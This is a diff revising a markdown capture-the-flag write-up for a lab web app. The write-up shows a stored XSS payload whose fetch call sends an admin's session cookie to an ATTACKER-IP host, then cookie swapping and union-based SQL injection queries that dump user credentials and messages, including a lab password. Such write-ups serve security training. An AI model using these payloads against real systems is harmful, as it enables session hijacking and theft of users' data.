@@ -72,7 +72,7 @@ Let's try to exploit our second point, the **Sign up** page as well as the autho
 
 When signing up, the *New listing* option appears:
 
-![new-listing](new-listing.png)
+![new-listing](new-listing.png){. width="50%}
 
 We can check if the site is vulnerable to [XSS](https://owasp.org/www-community/attacks/xss/), by writing some simple code and see how the site reacts:
 
@@ -82,30 +82,32 @@ Now, we can take advantage of the hint. If we visit the **developer's console** 
 
 ![session-cookie](document-cookie.png)
 
-The plan is the following:
-1. Open a python http server:
+The plan is as follows:
+1. Open a **python http server**:
 
 ```shell
-python -m http.server 8888
+python -m http.server 12345
 ```
 
-2. Create a new listing with code that will **steal another's user cookie and sent it back to us**.
+2. Create a new listing with code that will **steal another user's cookie and sent it back to us**.
 
 ```javascript
-<script>fetch("http://ATTACKER-IP:8888/"+document.cookie)</script>
+<script>fetch("http://ATTACKER-IP:12345/"+document.cookie)</script>
 ```
 
 ![cookie-stealer](cookie-stealer.png)
 
-2. Now, we need a way to **"force" an admin to interact with our listing**. That is because we want the code to be executed on the admin's browser, and not ours. This is where the reporting hint comes handy. We can create a listing, report it, and then an admin should come and review it.
+3. Now, we need a way to **"force" an admin to interact with our listing**. That is because we want the code to be executed on the admin's browser, and not ours. This is where the reporting hint comes handy. We can create a new listing, report it, and then an admin should come and review it.
 
 ![report-to-admin](report-to-admin.jpg)
 
-3. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should already have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!
+4. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should already have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!
 
 ![admin-cookie](admin-cookie.png)
 
-4. All we have to do now, is swapping our cookie with admin's cookie to access. We can do that by the brower's console:
+> Don't get confused because the port is shwoing as `8888` instead of `12345`. I just had to restart and ended up to use another port!
+
+5. All we have to do now, is swapping our cookie with admin's cookie to access. We can do that by the brower's console:
 
 ```javascript
 // we need to allow pasting, so we can paste our cookie
@@ -116,13 +118,13 @@ document.cookie="token=ADMIN_COOKIE"
 
 ![cookie-swap](cookie-swap.png)
 
-Once we refresh the page, the **Administration panel** appears 🍻, which includes our first 🚩!
+Once we refresh the page, the **Administration panel** appears, which includes our first 🚩 🍻!
 
 ![admin-panel](admin-panel.jpg)
 
 ### 3.2 IDOR & SQLi
 
-When clicking on the different users, the address bar change as follows: `/admin?user=`. So, we have the parameter `?user` to play with and check if the site is susceptible to an *IDOR vulnerability*.
+When clicking on the different users, the address bar change as follows: `/admin?user=`. So, we have the parameter `?user` to play with, which we can check if it is susceptible to an *IDOR vulnerability*.
 
 The first thing we can do is trying to break the query. Usually, putting an `'` at the end does the trick:
 
@@ -130,9 +132,10 @@ The first thing we can do is trying to break the query. Usually, putting an `'` 
 
 The fact that we are getting this error message confirms that existence of an *SQLi vulnerability*, but it is also kind enough to provide us with some extra information and let us know that the server uses *MySQL server*.
 
-We can now try a *Union-Based SQLi* byusing the `UNION` clause to extract the information needed. 
+We can now try a *Union-Based SQLi* by using the `UNION` clause to extract the information needed. 
 
 1. First, our goal is to get rid of the error message.
+
 ```SQL
 admin?user=1 UNION SELECT 1;--
 ```
@@ -140,6 +143,7 @@ admin?user=1 UNION SELECT 1;--
 ![sqli-1](sqli-1.png)
 
 The error message informs us that our `SELECT` statement have a different number of columns. After trying `1,2` and `1,2,3`, we get something that works:
+
 ```SQL
 admin?user=1 UNION SELECT 1,2,3,4;--
 ```
@@ -156,7 +160,7 @@ admin?user=1 UNION SELECT group_concat(schema_name),2,3,4 from information_schem
 
 The result is displaying the first part of our query: `user=1`, but not the information after the `UNION` clause. That is because it takes the first returned result somewhere in the web site's code and shows just that.
 
-To bypass this issue, we need the first query to procude no results. Since we know that the site has 4 users, and their IDs start from 1, we can change the value of the parameter `user` to `0`. By doing that, the `user=0` will return `FALSE` and have not results to show us back, so it will continue with the rest of our query.
+To bypass this issue, we need the first query to produce no results. Since we know that the first user's ID is `1`, we can change the value of the parameter `user` to `0`. By doing that, the `user=0` will return `FALSE` and have no results to show us back, so it will continue with the rest of our query.
 
 ```SQL
 admin?user=0 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
@@ -172,16 +176,17 @@ admin?user=0 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema
 
 ![sqli-5](sqli-5.png)
 
-4. There are 3 tables: `items`, `messages`, and `users`. The latter seems the most useful as it could contains sensitive data, such as passwords, so let's find out its columns:
+4. There are 3 tables: `items`, `messages`, and `users`. The latter seems the most useful, as it could contain sensitive data, such as passwords, so let's find out its columns:
 
 ```SQL
 admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name='users'--
 ```
+
 ![sqli-6](sqli-6.png)
 
-Bingo 🎉 ! We can see that the `users` table contains the column `password`, among others.
+Bingo 🎉 ! We can see that the `users` table contains a `password` field, among others.
 
-5. Let's see all the data of the `users` table:
+5. Now we know the column names. we can see all the data of the `users` table:
 
 ```SQL
 admin?user=0 UNION SELECT group_concat(id, ':', username, ':', password, ':', isAdministrator, '\n'),2,3,4 FROM marketplace.users; --
@@ -205,7 +210,7 @@ admin?user=0 UNION SELECT group_concat(id, ':', message_content, ':', user_from,
 
 ![sqli-9](sqli-9.png)
 
-There is a message revealing a new password 🔒. We know that this password belongs to user `jake`, as 4th value is the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 
+There is a message revealing a new password 🔒. We know that this password belongs to user `jake`, as the fourth value is the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 
 
 ### 3.3 Sudo & Wildcard Injection
 
